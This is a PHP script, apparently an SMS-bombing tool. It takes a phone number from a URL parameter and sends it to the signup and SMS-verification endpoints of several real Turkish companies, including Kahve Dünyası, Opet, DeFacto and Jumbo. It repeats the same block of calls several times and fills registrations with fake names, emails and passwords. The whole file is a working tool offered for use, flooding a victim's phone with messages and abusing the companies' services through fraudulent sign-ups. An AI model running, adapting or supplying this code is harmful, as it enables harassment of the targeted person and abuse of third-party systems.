	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	



	




}

?>